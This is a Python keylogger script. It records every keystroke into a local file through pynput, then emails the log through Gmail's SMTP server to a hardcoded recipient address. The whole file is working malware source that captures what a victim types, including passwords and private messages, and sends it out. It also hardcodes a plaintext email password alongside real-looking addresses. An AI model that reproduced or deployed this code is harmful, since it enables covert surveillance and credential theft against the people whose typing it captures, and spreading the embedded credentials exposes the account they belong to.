from pynput import keyboard
import smtplib,ssl  #smtp and secure socket layer 


sender_mail = "swapnaligawade1998@gmail.com"    

receiver_mail = "swapnaligawade88@gmail.com"  
password = "Passcode@1998"              # Enter your Password here
port = 587
message = """From: swapnaligawade1998@gmail.com
To: swapnaligawade88@gmail.com                         
Subject: KeyLogs


Text: Keylogs 
"""
def write(text):
    with open("keylogger.txt",'a') as f:
        f.write(text)
        f.close()


def on_key_press(Key):
    try:
        if(Key == keyboard.Key.enter):
            write("\n")
        else:
            write(Key.char)
    except AttributeError:
        if Key == keyboard.Key.backspace:
            write("\nBackspace Pressed\n")
        elif(Key == keyboard.Key.tab):
            write("\nTab Pressed\n")
        elif(Key == keyboard.Key.space):
            write(" ");
        else:
            temp = repr(Key)+" Pressed.\n"
            write(temp)
            print("\n{} Pressed\n".format(Key))

#To stop the listener/Keylogger by using "esc" key
def on_key_release(Key):
    if(Key == keyboard.Key.esc):
        return False

with keyboard.Listener(on_press= on_key_press,on_release= on_key_release) as listener:
    listener.join()

with open("keylogger.txt",'r') as f:
    temp = f.read()
    message = message + str(temp)
    f.close()


context = ssl.create_default_context()
server = smtplib.SMTP('smtp.gmail.com', port)
server.starttls()
server.login(sender_mail,password)
server.sendmail(sender_mail,receiver_mail,message)
print("Email Sent to ",sender_mail)
server.quit()
